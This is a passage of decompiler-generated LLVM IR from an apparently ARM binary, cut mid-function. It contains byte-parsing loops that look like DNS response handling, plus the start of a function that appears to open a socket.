  %v0_104ec = phi i32 [ %v0_104ec45, %dec_label_pc_104e0.preheader ], [ %v3_10508, %dec_label_pc_104e8 ]
  %v0_105b0 = phi i32 [ %v0_104e843, %dec_label_pc_104e0.preheader ], [ %v2_104f8, %dec_label_pc_104e8 ]
  %v0_104e0 = phi i32 [ %v0_104e041, %dec_label_pc_104e0.preheader ], [ %v3_104fc, %dec_label_pc_104e8 ]
  %v7_104e0 = icmp eq i32 %v0_104e0, 191
  store i1 %v7_104e0, i1* %cpsr_z.global-to-local, align 1
  %tmp180 = icmp ult i32 %v0_104e0, 192
  br i1 %tmp180, label %dec_label_pc_105ac, label %dec_label_pc_104e8

dec_label_pc_104e8:                               ; preds = %dec_label_pc_104e0
  %v1_104e8 = add i32 %v0_105b0, 1
  %v2_104e8 = inttoptr i32 %v1_104e8 to i8*
  %v3_104e8 = load i8, i8* %v2_104e8, align 1
  %v4_104e8 = zext i8 %v3_104e8 to i32
  store i32 %v2_1027c, i32* %r1.global-to-local, align 4
  %v2_104ec = add i32 %v0_104ec, %v1_10564
  %v2_104f8 = add i32 %v2_104ec, %v4_104e8
  store i32 %v2_104f8, i32* %r3.global-to-local, align 4
  %v1_104fc = inttoptr i32 %v2_104f8 to i8*
  %v2_104fc = load i8, i8* %v1_104fc, align 1
  %v3_104fc = zext i8 %v2_104fc to i32
  store i32 %v3_104fc, i32* %r2.global-to-local, align 4
  %v2_10500 = icmp eq i8 %v2_104fc, 0
  store i1 %v2_10500, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_10508 = mul nuw nsw i32 %v3_104fc, 256
  store i32 %v3_10508, i32* %r1.global-to-local, align 4
  br i1 %v2_10500, label %dec_label_pc_10510, label %dec_label_pc_104e0

dec_label_pc_10510:                               ; preds = %dec_label_pc_104d0.backedge, %dec_label_pc_104e8, %dec_label_pc_104c4
  %v1_10514 = phi i32 [ 1, %dec_label_pc_104c4 ], [ %v1_105b4, %dec_label_pc_104e8 ], [ %v1_105b449, %dec_label_pc_104d0.backedge ]
  %v0_10510 = phi i32 [ 0, %dec_label_pc_104c4 ], [ 1, %dec_label_pc_104e8 ], [ %v0_105ac, %dec_label_pc_104d0.backedge ]
  %v7_10510 = icmp eq i32 %v0_10510, 1
  store i1 %v7_10510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10510, label %bb127, label %bb128

bb127:                                            ; preds = %dec_label_pc_10510
  %v2_10514 = add i32 %v1_10514, 1
  store i32 %v2_10514, i32* %ip.global-to-local, align 4
  br label %bb128

bb128:                                            ; preds = %dec_label_pc_10510, %bb127
  %v1_10518 = phi i32 [ %v1_10514, %dec_label_pc_10510 ], [ %v2_10514, %bb127 ]
  %v2_10518 = add i32 %v1_10518, %v0_10518152
  store i32 %v2_10518, i32* @r4, align 4
  %v3_1051c = inttoptr i32 %v2_10518 to i8*
  %v4_1051c = load i8, i8* %v3_1051c, align 1
  %v6_1051c = zext i8 %v4_1051c to i32
  store i32 %v6_1051c, i32* %r3.global-to-local, align 4
  %v1_10520 = add i32 %v2_10518, 1
  %v2_10520 = inttoptr i32 %v1_10520 to i8*
  %v3_10520 = load i8, i8* %v2_10520, align 1
  %v4_10520 = zext i8 %v3_10520 to i32
  store i32 %v4_10520, i32* %r2.global-to-local, align 4
  %v4_10524 = mul nuw nsw i32 %v4_10520, 256
  %v5_10524 = or i32 %v4_10524, %v6_1051c
  store i32 %v5_10524, i32* %r3.global-to-local, align 4
  %v7_10528 = icmp eq i32 %v5_10524, 256
  store i1 %v7_10528, i1* %cpsr_z.global-to-local, align 1
  %v1_1052c = add i32 %v2_10518, 10
  store i32 %v1_1052c, i32* @r5, align 4
  br i1 %v7_10528, label %dec_label_pc_105cc, label %dec_label_pc_10534

dec_label_pc_10534:                               ; preds = %dec_label_pc_105cc, %bb128
  store i32 %v1_1052c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1054023 = inttoptr i32 %v1_1052c to i8*
  %v2_1054024 = load i8, i8* %v1_1054023, align 1
  %v3_1054025 = zext i8 %v2_1054024 to i32
  store i32 %v3_1054025, i32* %r2.global-to-local, align 4
  %v2_1054426 = icmp eq i8 %v2_1054024, 0
  store i1 %v2_1054426, i1* %cpsr_z.global-to-local, align 1
  %v3_1054827 = mul nuw nsw i32 %v3_1054025, 256
  store i32 %v3_1054827, i32* %r1.global-to-local, align 4
  br i1 %v2_1054426, label %dec_label_pc_10580, label %dec_label_pc_10550.preheader

dec_label_pc_10550.preheader:                     ; preds = %dec_label_pc_10534, %dec_label_pc_10540.backedge
  %v1_105c4 = phi i32 [ %v1_105c464, %dec_label_pc_10540.backedge ], [ 1, %dec_label_pc_10534 ]
  %v0_105bc62 = phi i32 [ %v0_105bc, %dec_label_pc_10540.backedge ], [ 0, %dec_label_pc_10534 ]
  %v0_1055c60 = phi i32 [ %v3_10548, %dec_label_pc_10540.backedge ], [ %v3_1054827, %dec_label_pc_10534 ]
  %v0_1055858 = phi i32 [ %v1_105c0, %dec_label_pc_10540.backedge ], [ %v1_1052c, %dec_label_pc_10534 ]
  %v0_1055056 = phi i32 [ %v3_10540, %dec_label_pc_10540.backedge ], [ %v3_1054025, %dec_label_pc_10534 ]
  br label %dec_label_pc_10550

dec_label_pc_10550:                               ; preds = %dec_label_pc_10550.preheader, %dec_label_pc_10558
  %v0_105bc = phi i32 [ %v0_105bc62, %dec_label_pc_10550.preheader ], [ 1, %dec_label_pc_10558 ]
  %v0_1055c = phi i32 [ %v0_1055c60, %dec_label_pc_10550.preheader ], [ %v3_10578, %dec_label_pc_10558 ]
  %v0_105c0 = phi i32 [ %v0_1055858, %dec_label_pc_10550.preheader ], [ %v2_10568, %dec_label_pc_10558 ]
  %v0_10550 = phi i32 [ %v0_1055056, %dec_label_pc_10550.preheader ], [ %v3_1056c, %dec_label_pc_10558 ]
  %v7_10550 = icmp eq i32 %v0_10550, 191
  store i1 %v7_10550, i1* %cpsr_z.global-to-local, align 1
  %tmp181 = icmp ult i32 %v0_10550, 192
  br i1 %tmp181, label %dec_label_pc_105bc, label %dec_label_pc_10558

dec_label_pc_10558:                               ; preds = %dec_label_pc_10550
  %v1_10558 = add i32 %v0_105c0, 1
  %v2_10558 = inttoptr i32 %v1_10558 to i8*
  %v3_10558 = load i8, i8* %v2_10558, align 1
  %v4_10558 = zext i8 %v3_10558 to i32
  store i32 %v2_1027c, i32* %r1.global-to-local, align 4
  %v2_1055c = add i32 %v0_1055c, %v1_10564
  %v2_10568 = add i32 %v2_1055c, %v4_10558
  store i32 %v2_10568, i32* %r3.global-to-local, align 4
  %v1_1056c = inttoptr i32 %v2_10568 to i8*
  %v2_1056c = load i8, i8* %v1_1056c, align 1
  %v3_1056c = zext i8 %v2_1056c to i32
  store i32 %v3_1056c, i32* %r2.global-to-local, align 4
  %v2_10570 = icmp eq i8 %v2_1056c, 0
  store i1 %v2_10570, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_10578 = mul nuw nsw i32 %v3_1056c, 256
  store i32 %v3_10578, i32* %r1.global-to-local, align 4
  br i1 %v2_10570, label %dec_label_pc_10580, label %dec_label_pc_10550

dec_label_pc_10580:                               ; preds = %dec_label_pc_10540.backedge, %dec_label_pc_10558, %dec_label_pc_10534
  %v1_10584 = phi i32 [ 1, %dec_label_pc_10534 ], [ %v1_105c4, %dec_label_pc_10558 ], [ %v1_105c464, %dec_label_pc_10540.backedge ]
  %v0_10580 = phi i32 [ 0, %dec_label_pc_10534 ], [ 1, %dec_label_pc_10558 ], [ %v0_105bc, %dec_label_pc_10540.backedge ]
  %v7_10580 = icmp eq i32 %v0_10580, 1
  store i1 %v7_10580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10580, label %bb129, label %bb130

bb129:                                            ; preds = %dec_label_pc_10580
  %v2_10584 = add i32 %v1_10584, 1
  store i32 %v2_10584, i32* %r0.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_10580, %bb129
  %v1_10588 = phi i32 [ %v1_10584, %dec_label_pc_10580 ], [ %v2_10584, %bb129 ]
  %v2_10588 = add i32 %v1_10588, %v1_1052c
  br label %dec_label_pc_104b0.backedge

dec_label_pc_104b0.backedge:                      ; preds = %bb130, %dec_label_pc_10674
  %v0_104b0.pre = phi i32 [ %v3_104bc153, %bb130 ], [ %v0_104b0.pre.pre, %dec_label_pc_10674 ]
  %storemerge = phi i32 [ %v2_10588, %bb130 ], [ %v2_10688, %dec_label_pc_10674 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_104b0 = add i32 %v0_104b0.pre, -1
  %v3_104b4 = mul i32 %v1_104b0, 65536
  store i32 %v3_104b4, i32* %r3.global-to-local, align 4
  %v7_104b8 = icmp eq i32 %v3_104b4, -65536
  store i1 %v7_104b8, i1* %cpsr_z.global-to-local, align 1
  %v3_104bc = urem i32 %v1_104b0, 65536
  store i32 %v3_104bc, i32* @r6, align 4
  br i1 %v7_104b8, label %dec_label_pc_10424, label %dec_label_pc_104c4

dec_label_pc_10590:                               ; preds = %dec_label_pc_10424
  %v1_10590 = add i32 %v2_1015c, 4
  %v2_10590 = inttoptr i32 %v1_10590 to i32*
  %v3_10590 = load i32, i32* %v2_10590, align 4
  store i32 %v3_10590, i32* %r0.global-to-local, align 4
  %v2_10594 = icmp eq i32 %v3_10590, 0
  store i1 %v2_10594, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1059c.181 to i32), i32* @lr, align 4
  %v1_10598 = xor i1 %v2_10594, true
  call void @__pseudo_cond_branch(i1 %v1_10598, i32 ptrtoint (i32* @global_var_142ac.59 to i32))
  store i32 %v2_1015c, i32* @r0, align 4
  %v0_105a0 = call i32 @function_142ac()
  store i32 %v0_105a0, i32* %r0.global-to-local, align 4
  %v0_105a4 = load i32, i32* @r4, align 4
  %v5_105a4 = inttoptr i32 %v0_105a4 to i8*
  br label %dec_label_pc_1043c

dec_label_pc_105ac:                               ; preds = %dec_label_pc_104e0
  %v2_105ac = icmp eq i32 %v0_105ac, 0
  store i1 %v2_105ac, i1* %cpsr_z.global-to-local, align 1
  %v1_105b0 = add i32 %v0_105b0, 1
  store i32 %v1_105b0, i32* %r3.global-to-local, align 4
  br i1 %v2_105ac, label %bb131, label %dec_label_pc_104d0.backedge

dec_label_pc_104d0.backedge:                      ; preds = %dec_label_pc_105ac, %bb131
  %v1_105b449 = phi i32 [ %v1_105b4, %dec_label_pc_105ac ], [ %v2_105b4, %bb131 ]
  %v1_104d0 = inttoptr i32 %v1_105b0 to i8*
  %v2_104d0 = load i8, i8* %v1_104d0, align 1
  %v3_104d0 = zext i8 %v2_104d0 to i32
  store i32 %v3_104d0, i32* %r2.global-to-local, align 4
  %v2_104d4 = icmp eq i8 %v2_104d0, 0
  store i1 %v2_104d4, i1* %cpsr_z.global-to-local, align 1
  %v3_104d8 = mul nuw nsw i32 %v3_104d0, 256
  store i32 %v3_104d8, i32* %r1.global-to-local, align 4
  br i1 %v2_104d4, label %dec_label_pc_10510, label %dec_label_pc_104e0.preheader

bb131:                                            ; preds = %dec_label_pc_105ac
  %v2_105b4 = add i32 %v1_105b4, 1
  store i32 %v2_105b4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_104d0.backedge

dec_label_pc_105bc:                               ; preds = %dec_label_pc_10550
  %v2_105bc = icmp eq i32 %v0_105bc, 0
  store i1 %v2_105bc, i1* %cpsr_z.global-to-local, align 1
  %v1_105c0 = add i32 %v0_105c0, 1
  store i32 %v1_105c0, i32* %r3.global-to-local, align 4
  br i1 %v2_105bc, label %bb132, label %dec_label_pc_10540.backedge

dec_label_pc_10540.backedge:                      ; preds = %dec_label_pc_105bc, %bb132
  %v1_105c464 = phi i32 [ %v1_105c4, %dec_label_pc_105bc ], [ %v2_105c4, %bb132 ]
  %v1_10540 = inttoptr i32 %v1_105c0 to i8*
  %v2_10540 = load i8, i8* %v1_10540, align 1
  %v3_10540 = zext i8 %v2_10540 to i32
  store i32 %v3_10540, i32* %r2.global-to-local, align 4
  %v2_10544 = icmp eq i8 %v2_10540, 0
  store i1 %v2_10544, i1* %cpsr_z.global-to-local, align 1
  %v3_10548 = mul nuw nsw i32 %v3_10540, 256
  store i32 %v3_10548, i32* %r1.global-to-local, align 4
  br i1 %v2_10544, label %dec_label_pc_10580, label %dec_label_pc_10550.preheader

bb132:                                            ; preds = %dec_label_pc_105bc
  %v2_105c4 = add i32 %v1_105c4, 1
  store i32 %v2_105c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10540.backedge

dec_label_pc_105cc:                               ; preds = %bb128
  %v1_105cc = add i32 %v2_10518, 2
  %v2_105cc = inttoptr i32 %v1_105cc to i8*
  %v3_105cc = load i8, i8* %v2_105cc, align 1
  %v4_105cc = zext i8 %v3_105cc to i32
  store i32 %v4_105cc, i32* %r3.global-to-local, align 4
  %v1_105d0 = add i32 %v2_10518, 3
  %v2_105d0 = inttoptr i32 %v1_105d0 to i8*
  %v3_105d0 = load i8, i8* %v2_105d0, align 1
  %v4_105d0 = zext i8 %v3_105d0 to i32
  store i32 %v4_105d0, i32* %r2.global-to-local, align 4
  %v4_105d4 = mul nuw nsw i32 %v4_105d0, 256
  %v5_105d4 = or i32 %v4_105d4, %v4_105cc
  store i32 %v5_105d4, i32* %r3.global-to-local, align 4
  %v7_105d8 = icmp eq i32 %v5_105d4, 256
  store i1 %v7_105d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105d8, label %dec_label_pc_105e0, label %dec_label_pc_10534

dec_label_pc_105e0:                               ; preds = %dec_label_pc_105cc
  %v1_105e0 = add i32 %v2_10518, 8
  %v2_105e0 = inttoptr i32 %v1_105e0 to i8*
  %v3_105e0 = load i8, i8* %v2_105e0, align 1
  %v4_105e0 = zext i8 %v3_105e0 to i32
  store i32 %v4_105e0, i32* %r1.global-to-local, align 4
  %v1_105e4 = add i32 %v2_10518, 9
  %v2_105e4 = inttoptr i32 %v1_105e4 to i8*
  %v3_105e4 = load i8, i8* %v2_105e4, align 1
  %v4_105e4 = zext i8 %v3_105e4 to i32
  store i32 %v4_105e4, i32* %r0.global-to-local, align 4
  %v4_105e8 = mul nuw nsw i32 %v4_105e4, 256
  %v5_105e8 = or i32 %v4_105e8, %v4_105e0
  %v3_105ec = mul i32 %v5_105e8, 65536
  store i32 %v3_105ec, i32* %r2.global-to-local, align 4
  %v3_105f0 = mul nuw nsw i32 %v4_105e0, 256
  %v5_105f8 = or i32 %v4_105e4, %v3_105f0
  store i32 %v5_105f8, i32* %r3.global-to-local, align 4
  %v7_105fc = icmp eq i32 %v5_105f8, 4
  store i1 %v7_105fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105fc, label %dec_label_pc_10604, label %dec_label_pc_10674

dec_label_pc_10604:                               ; preds = %dec_label_pc_105e0
  %v2_10604 = inttoptr i32 %v1_1052c to i8*
  %v3_10604 = load i8, i8* %v2_10604, align 1
  %v4_10604 = zext i8 %v3_10604 to i32
  store i32 %v4_10604, i32* %r3.global-to-local, align 4
  store i32 %v2_101dc, i32* %r2.global-to-local, align 4
  %v1_10610 = add i32 %v2_10518, 11
  %v2_10610 = inttoptr i32 %v1_10610 to i8*
  %v3_10610 = load i8, i8* %v2_10610, align 1
  %v4_10610 = zext i8 %v3_10610 to i32
  store i32 %v4_10610, i32* %r2.global-to-local, align 4
  store i32 %v2_101dc, i32* %r3.global-to-local, align 4
  %v1_1061c = add i32 %v2_10518, 12
  %v2_1061c = inttoptr i32 %v1_1061c to i8*
  %v3_1061c = load i8, i8* %v2_1061c, align 1
  %v4_1061c = zext i8 %v3_1061c to i32
  store i32 %v4_1061c, i32* %r3.global-to-local, align 4
  store i32 %v2_101dc, i32* %ip.global-to-local, align 4
  %v1_10628 = add i32 %v2_10518, 13
  %v2_10628 = inttoptr i32 %v1_10628 to i8*
  %v3_10628 = load i8, i8* %v2_10628, align 1
  %v4_10628 = zext i8 %v3_10628 to i32
  store i32 %v4_10628, i32* %r2.global-to-local, align 4
  store i32 %v2_1015c, i32* @lr, align 4
  %v2_10634 = load i8, i8* %v3_1015c, align 1
  %v3_10634 = zext i8 %v2_10634 to i32
  %v3_10638 = mul nuw nsw i32 %v3_10634, 4
  %v1_1063c = add nuw nsw i32 %v3_10638, 4
  store i32 %v1_1063c, i32* %r1.global-to-local, align 4
  %v3_10640 = load i32, i32* %v2_10640, align 4
  store i32 %v3_10640, i32* %r0.global-to-local, align 4
  %v3_10644 = sext i8 %v3_10628 to i32
  %v5_10644 = sext i8 %v3_1061c to i32
  %v10_10644 = call i32 @function_1439c(i32 %v3_10640, i32 %v1_1063c, i32 %v3_10644, i32 %v5_10644)
  store i32 %v10_10644, i32* %r0.global-to-local, align 4
  store i32 %v2_1015c, i32* %r1.global-to-local, align 4
  store i32 %v2_101dc, i32* %ip.global-to-local, align 4
  %v2_10650 = load i8, i8* %v3_1015c, align 1
  %v3_10650 = zext i8 %v2_10650 to i32
  store i32 %v3_10650, i32* %r2.global-to-local, align 4
  %v4_10654 = sext i8 %v3_10604 to i32
  store i32 %v4_10654, i32* %r3.global-to-local, align 4
  store i32 %v2_1015c, i32* @lr, align 4
  %v1_1065c = add nuw nsw i32 %v3_10650, 1
  store i32 %v1_1065c, i32* %r1.global-to-local, align 4
  %v5_10660 = mul nuw nsw i32 %v3_10650, 4
  %v6_10660 = add i32 %v5_10660, %v10_10644
  %v7_10660 = inttoptr i32 %v6_10660 to i32*
  store i32 %v4_10654, i32* %v7_10660, align 4
  %v1_10664 = load i32, i32* @lr, align 4
  %v2_10664 = add i32 %v1_10664, 4
  %v3_10664 = inttoptr i32 %v2_10664 to i32*
  store i32 %v10_10644, i32* %v3_10664, align 4
  %v0_10668 = load i32, i32* %r1.global-to-local, align 4
  %v1_10668 = trunc i32 %v0_10668 to i8
  %v2_10668 = load i32, i32* @lr, align 4
  %v3_10668 = inttoptr i32 %v2_10668 to i8*
  store i8 %v1_10668, i8* %v3_10668, align 1
  %v0_1066c = load i32, i32* @r4, align 4
  %v1_1066c = add i32 %v0_1066c, 9
  %v2_1066c = inttoptr i32 %v1_1066c to i8*
  %v3_1066c = load i8, i8* %v2_1066c, align 1
  %v4_1066c = zext i8 %v3_1066c to i32
  store i32 %v4_1066c, i32* %r0.global-to-local, align 4
  %v1_10670 = add i32 %v0_1066c, 8
  %v2_10670 = inttoptr i32 %v1_10670 to i8*
  %v3_10670 = load i8, i8* %v2_10670, align 1
  %v4_10670 = zext i8 %v3_10670 to i32
  store i32 %v4_10670, i32* %r1.global-to-local, align 4
  %v0_10688.pre = load i32, i32* @r5, align 4
  %v0_104b0.pre.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10674

dec_label_pc_10674:                               ; preds = %dec_label_pc_105e0, %dec_label_pc_10604
  %v0_104b0.pre.pre = phi i32 [ %v3_104bc153, %dec_label_pc_105e0 ], [ %v0_104b0.pre.pre.pre, %dec_label_pc_10604 ]
  %v0_10688 = phi i32 [ %v1_1052c, %dec_label_pc_105e0 ], [ %v0_10688.pre, %dec_label_pc_10604 ]
  %v1_10674 = phi i32 [ %v4_105e4, %dec_label_pc_105e0 ], [ %v4_1066c, %dec_label_pc_10604 ]
  %v0_10674 = phi i32 [ %v4_105e0, %dec_label_pc_105e0 ], [ %v4_10670, %dec_label_pc_10604 ]
  %v4_10674 = mul nuw nsw i32 %v1_10674, 256
  %v5_10674 = or i32 %v4_10674, %v0_10674
  %v3_10678 = mul i32 %v5_10674, 65536
  store i32 %v3_10678, i32* %r2.global-to-local, align 4
  %tmp133 = mul nuw nsw i32 %v0_10674, 256
  %v5_10684 = or i32 %tmp133, %v1_10674
  store i32 %v5_10684, i32* %r3.global-to-local, align 4
  %v2_10688 = add i32 %v5_10684, %v0_10688
  br label %dec_label_pc_104b0.backedge

; uselistorder directives
  uselistorder i32 %v1_10674, { 1, 0 }
  uselistorder i32 %v3_10650, { 1, 0, 2 }
  uselistorder i32 %v10_10644, { 1, 0, 2 }
  uselistorder i32 %v4_105e4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_105e0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_105c4, { 1, 0 }
  uselistorder i32 %v3_10540, { 0, 2, 1 }
  uselistorder i32 %v1_105c464, { 1, 0 }
  uselistorder i32 %v1_105c0, { 1, 2, 0 }
  uselistorder i32 %v2_105b4, { 1, 0 }
  uselistorder i32 %v3_104d0, { 0, 2, 1 }
  uselistorder i32 %v1_105b449, { 1, 0 }
  uselistorder i32 %v1_105b0, { 1, 2, 0 }
  uselistorder i1 %v7_104b8, { 1, 0 }
  uselistorder i32 %v1_104b0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v3_1056c, { 0, 2, 1 }
  uselistorder i32 %v2_10568, { 1, 2, 0 }
  uselistorder i32 %v0_105bc, { 2, 0, 1 }
  uselistorder i32 %v1_105c4, { 1, 2, 0 }
  uselistorder i32 %v3_1054827, { 1, 0 }
  uselistorder i32 %v3_1054025, { 1, 0, 2 }
  uselistorder i32 %v1_1052c, { 2, 3, 1, 0, 5, 4, 6 }
  uselistorder i32 %v2_10518, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_104fc, { 0, 2, 1 }
  uselistorder i32 %v2_104f8, { 1, 2, 0 }
  uselistorder i32 %v0_105ac, { 2, 0, 1 }
  uselistorder i32 %v1_105b4, { 1, 2, 0 }
  uselistorder i32 %v3_104d821, { 1, 0 }
  uselistorder i32 %v3_104d019, { 1, 0, 2 }
  uselistorder i32 %v0_10518152, { 3, 0, 1, 2 }
  uselistorder i32 %v3_104bc151, { 1, 0 }
  uselistorder i1 %v7_104b8150, { 1, 0 }
  uselistorder i32 %v1_104b0143, { 1, 0 }
  uselistorder i32 %v4_10498, { 1, 0, 2 }
  uselistorder i32 %v0_1041c, { 1, 0 }
  uselistorder i32 %v0_103f4, { 1, 0 }
  uselistorder i1 %v7_103a8, { 1, 0 }
  uselistorder i32 %v5_103a4, { 1, 0, 2 }
  uselistorder i32 %v1_10368, { 1, 0 }
  uselistorder i32 %v3_10354, { 1, 0 }
  uselistorder i32 %v0_1034c, { 1, 0 }
  uselistorder i32 %v1_10340, { 1, 2, 0 }
  uselistorder i1 %v7_1030c, { 1, 0 }
  uselistorder i32 %v5_10308, { 1, 0, 2 }
  uselistorder i1 %v7_102f0, { 1, 0 }
  uselistorder i32 %v4_102ec, { 1, 0, 2 }
  uselistorder i1 %v7_102d4, { 1, 0 }
  uselistorder i32 %v3_102d0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_102b8, { 2, 1, 0 }
  uselistorder i32 %v1_102bc, { 1, 0 }
  uselistorder i32 %v1_1045c, { 1, 2, 0 }
  uselistorder i32 %v2_10358, { 1, 0, 2 }
  uselistorder i32 %v2_102b4, { 1, 0, 2 }
  uselistorder i32 %v2_1027c, { 4, 3, 2, 5, 7, 9, 1, 0, 6, 8, 10 }
  uselistorder i32 %v4_10230, { 3, 0, 2, 1 }
  uselistorder i32 %v1_101fc, { 1, 0, 2 }
  uselistorder i32 %v0_101b8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_101b4, { 1, 0, 2 }
  uselistorder i32 %v1_101b0, { 1, 0 }
  uselistorder i32 %v2_101a411, { 1, 0 }
  uselistorder i32 %v2_101a4, { 1, 0 }
  uselistorder i1 %v8_10194, { 1, 0 }
  uselistorder i32 %v2_1017c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10164, { 1, 0 }
  uselistorder i32 %v2_1015c, { 2, 3, 4, 5, 0, 1, 6, 7 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-2240, { 0, 2, 1 }
  uselistorder i32* %stack_var_-64, { 0, 1, 3, 2 }
  uselistorder i8* %stack_var_-4288, { 2, 0, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 10, 13, 11, 12, 14, 16, 33, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 34, 35, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 11, 7, 29, 9, 10, 28, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25, 27 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 11, 6, 7, 30, 9, 10, 27, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 28, 24, 29, 26 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 10, 6, 48, 7, 8, 9, 12, 11, 15, 14, 13, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 37, 32, 31, 33, 34, 35, 36, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 6, 3, 5, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 9, 3, 14, 4, 5, 15, 6, 7, 8, 35, 10, 11, 12, 13, 34, 36, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26, 27, 28, 33, 31, 29, 30, 32, 37 }
  uselistorder i32 (i32)* @function_14a84, { 10, 9, 3, 2, 11, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_10674, { 1, 0 }
  uselistorder label %dec_label_pc_10540.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_104d0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_104b0.backedge, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_10550, { 1, 0 }
  uselistorder label %dec_label_pc_10550.preheader, { 1, 0 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %dec_label_pc_104e0, { 1, 0 }
  uselistorder label %dec_label_pc_104e0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_104c4, { 1, 0 }
  uselistorder label %dec_label_pc_1043c, { 1, 0 }
  uselistorder label %dec_label_pc_10424, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10404, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1018c, { 1, 0 }
}

define i32 @function_10690(i32 %arg1) local_unnamed_addr {
dec_label_pc_10690:
  %v2_10694 = load i32, i32* @global_var_1eca0.183, align 4
  %v2_1069c = call i32 @function_13754(i32 %v2_10694, i32 9)
  %v0_106a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_106a0, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_10690
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_10690, %bb
  ret i32 %v2_1069c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_106a4() local_unnamed_addr {
dec_label_pc_106a4:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_106a4 = load i32, i32* @r4, align 4
  store i32 %v3_106a4, i32* %stack_var_-16, align 4
  %v0_106a8 = load i32, i32* @r0, align 4
  store i32 %v0_106a8, i32* %r5.global-to-local, align 4
  %v1_106ac = add i32 %v0_106a8, 4
  %v2_106ac = inttoptr i32 %v1_106ac to i32*
  %v3_106ac = load i32, i32* %v2_106ac, align 4
  store i32 %v3_106ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 67280, i32* @lr, align 4
  %v1_106cc = icmp ne i32 %v3_106ac, -1
  call void @__pseudo_cond_branch(i1 %v1_106cc, i32 ptrtoint (i32* @global_var_13654.26 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_106dc = call i32 @function_13f50(i32 2, i32 1, i32 0)
  store i32 %v3_106dc, i32* %r3.global-to-local, align 4
  %v7_106e4 = icmp eq i32 %v3_106dc, -1
  %v0_106ec = load i32, i32* %r5.global-to-local, align 4
  %v1_106ec = add i32 %v0_106ec, 28
  store i32 %v1_106ec, i32* %r0.global-to-local, align 4
  %v2_106f0 = add i32 %v0_106ec, 4
  %v3_106f0 = inttoptr i32 %v2_106f0 to i32*
  store i32 %v3_106dc, i32* %v3_106f0, align 4
  br i1 %v7_106e4, label %dec_label_pc_106a4.dec_label_pc_1076c_crit_edge, label %dec_label_pc_106f8

dec_label_pc_106a4.dec_label_pc_1076c_crit_edge:  ; preds = %dec_label_pc_106a4
  %v14_10770.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1076c

dec_label_pc_106f8:                               ; preds = %dec_label_pc_106a4
  %v0_106f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_106f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_106f8 = add i32 %v1_106f8, 24
  %v3_106f8 = inttoptr i32 %v2_106f8 to i32*
  store i32 %v0_106f8, i32* %v3_106f8, align 4
  %v0_106fc = load i32, i32* %r0.global-to-local, align 4
